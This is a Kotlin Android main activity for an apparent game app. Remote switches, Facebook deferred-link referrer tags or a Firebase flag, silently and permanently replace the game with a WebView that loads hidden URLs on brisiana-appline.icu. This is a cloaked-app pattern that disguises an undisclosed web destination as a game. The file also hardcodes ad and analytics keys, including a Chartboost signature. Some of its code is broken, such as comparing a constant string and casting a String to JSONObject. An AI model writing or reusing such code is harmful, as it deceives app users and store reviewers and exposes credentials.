package com.itGamePart.supervictoringame

import android.content.Intent
import android.content.SharedPreferences
import androidx.appcompat.app.AppCompatActivity
import android.os.Bundle
import android.widget.Button
import android.util.Log
import android.webkit.WebView
import com.appsflyer.AppsFlyerLib;
import com.appsflyer.AppsFlyerConversionListener;
import com.appsflyer.AppsFlyerLibCore.LOG_TAG
import com.appsflyer.internal.b
import com.appsflyer.internal.i
import org.json.JSONArray
import org.json.JSONException
import org.json.JSONObject
import java.util.Map;
import java.util.*
import kotlin.collections.HashMap
import com.chartboost.sdk.Chartboost
import java.util.prefs.Preferences
import android.content.SharedPreferences.Editor
import com.facebook.applinks.AppLinkData
import com.google.firebase.database.DataSnapshot
import com.google.firebase.database.DatabaseError
import com.google.firebase.database.DatabaseReference
import com.google.firebase.database.ValueEventListener
import com.google.firebase.database.ktx.database
import com.google.firebase.ktx.Firebase



class MainActivity : AppCompatActivity() {

    private val devKey = "6KPTtL697i2EjSMGLG3VGH"

   
    fun shouldOverrideUrlLoading(view:WebView, url:String):Boolean {

        if (url.startsWith("af-event://")) {
            var urlParts:List<String> = url.split("\\?")
            if (urlParts.size > 1) {
                 var query:String = urlParts[1]
                var eventName:String? = null
                var eventValue:HashMap<String, Object> = HashMap()

                for (param:String in query.split("&")){
                    var pair:List<String> = param.split("=")
                    var key:String = pair[0]
                    if (pair.size > 1) {
                        if ("eventName".equals(key)) {
                            eventName = pair[1]
                        } else if ("eventValue".equals(key)) {
                            var event:JSONObject
                                    var keys:JSONArray
                                    try {
                                        var event:JSONObject = pair[1] as JSONObject
                                        var keys = event.names()
                                        for (i in 0 ..keys.length()){
                                            eventValue.put(
                                                keys.getString(i),
                                                event.getString(keys.getString(i)) as Object
                                            )
                                        }
                                    } catch (e: JSONException) {
                                        e.printStackTrace()
                                    }
                        }
                    }
                }
                AppsFlyerLib.getInstance().trackEvent(getApplicationContext(),eventName,
                    eventValue as kotlin.collections.Map<String, Any>?
                )
            }
            return true
        }
        view.loadUrl(url)
        return true
    }

    override fun onCreate(savedInstanceState: Bundle?) {
        var  mSettings = getSharedPreferences("Prefer", MODE_PRIVATE)
        Chartboost.startWithAppId(null,"5e78b440259b350a9727c319","487c9da77f0ff3ab293f97ee4e59dfc420ee7f79")
        super.onCreate(savedInstanceState)
        AppLinkData.fetchDeferredAppLinkData(this, "227587621694789", AppLinkData.CompletionHandler(){
                fun onDeferredAppLinkDataFetched(appLinkData:AppLinkData) {
                    try {
                        if(mSettings.getString("wvGame","0")!= "1"){
                            var editor = mSettings.edit();
                            if(AppLinkData.ARGUMENTS_REFERER_DATA_KEY == "cvr1"){
                                editor.putString("wv", "https://brisiana-appline.icu/44cc082c-b989-43a8-a39c-1760ca6b6680");
                                editor.putString("wvGame", "1");
                                editor.apply();
                                goWV()
                            }
                            if(AppLinkData.ARGUMENTS_REFERER_DATA_KEY == "cvr2"){
                                editor.putString("wv", "https://brisiana-appline.icu/bb814a29-257c-49b4-affd-979f9cfffb0c");
                                editor.putString("wvGame", "1");
                                editor.apply();
                                goWV()
                            }
                            if(AppLinkData.ARGUMENTS_REFERER_DATA_KEY == "cvr3"){
                                editor.putString("wv", "https://brisiana-appline.icu/3c4738ef-3afe-4f7d-8780-1657e8f9b4f8");
                                editor.putString("wvGame", "1");
                                editor.apply();
                                goWV()
                            }
                            if(AppLinkData.ARGUMENTS_REFERER_DATA_KEY == "cvr4"){
                                editor.putString("wv", "https://brisiana-appline.icu/07e65161-6ddd-41f8-b0ef-38659e45e1bf");
                                editor.putString("wvGame", "1");
                                editor.apply();
                                goWV()
                            }
                            if(AppLinkData.ARGUMENTS_REFERER_DATA_KEY == "cvr5"){
                                editor.putString("wv", "https://brisiana-appline.icu/b23504b1-d28d-416e-9f6f-82e43c482cb0");
                                editor.putString("wvGame", "1");
                                editor.apply();
                                goWV()
                            }
                        }
                    } catch (e:Exception) {
                        e.printStackTrace()
                    }
                }
            })
       var database = Firebase.database.getReference("game")

            database.addValueEventListener(object : ValueEventListener {
            override fun onDataChange(dataSnapshot: DataSnapshot) {
                // This method is called once with the initial value and again
                // whenever data at this location is updated.
                if(dataSnapshot.getValue().toString() == "1"){
                    if(mSettings.getString("wvGame","0")!= "1"){
                    var editor = mSettings.edit()
                    editor.putString("wv", "https://brisiana-appline.icu/52c27808-19de-49cb-bf43-f94363758493");
                    editor.putString("wvGame", "1");
                    editor.apply();
                    goWV()
                    }
                }


            }
            override fun onCancelled(error: DatabaseError) {
                // Failed to read value

            }
        })


        if( mSettings.getString("wvGame","") == "1"){
            goWV()
        }

        val conversionDataListener  = object : AppsFlyerConversionListener{
            override fun onConversionDataSuccess(p0: MutableMap<String, Any>?) {

                p0?.let { cvData ->
                    cvData.map {
                        Log.i(LOG_TAG, "conversion_attribute:  ${it.key} = ${it.value}")
                    }
                }
            }

            override fun onConversionDataFail(error: String?) {
                Log.e(LOG_TAG, "error onAttributionFailure :  $error")
            }

            override fun onAppOpenAttribution(data: MutableMap<String, String>?) {
                data?.map {
                    Log.d(LOG_TAG, "onAppOpen_attribute: ${it.key} = ${it.value}")
                }
            }

            override fun onAttributionFailure(error: String?) {
                Log.e(LOG_TAG, "error onAttributionFailure :  $error")
            }
        }

        AppsFlyerLib.getInstance().init(devKey, conversionDataListener, applicationContext)
        AppsFlyerLib.getInstance().startTracking(this)

        setContentView(R.layout.activity_main)

        val playButton = findViewById<Button>(R.id.playButton)
        playButton.setOnClickListener {
            val intent = Intent(this, GameActivity::class.java)
            startActivity(intent)
        }
    }

fun goWV(){
    val intent = Intent(this, WebViewActivity::class.java)
    startActivity(intent)
}

}






